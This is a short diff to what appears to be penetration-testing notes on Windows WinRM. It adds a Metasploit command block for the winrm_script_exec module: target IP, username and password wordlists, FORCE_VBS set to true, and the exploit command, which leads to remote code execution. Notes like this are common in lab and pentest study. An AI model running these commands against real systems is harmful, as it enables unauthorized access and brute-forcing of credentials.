@@ -25,7 +25,13 @@
 	-> Don't forgot to `set FORCE_VBS TRUE` , set it on true
 5. Exploit Module For RCE
     -> `exploit/windows/winrm/winrm_script_exec`  (set Force_vbs true) 
-
+```
+set rhosts <Target_IP>
+set username <user_name/wordlist>
+set password <password/wordlist>
+set FORCE_VBS true
+exploit
+```
 
 ##### Wordlist:
 - Username
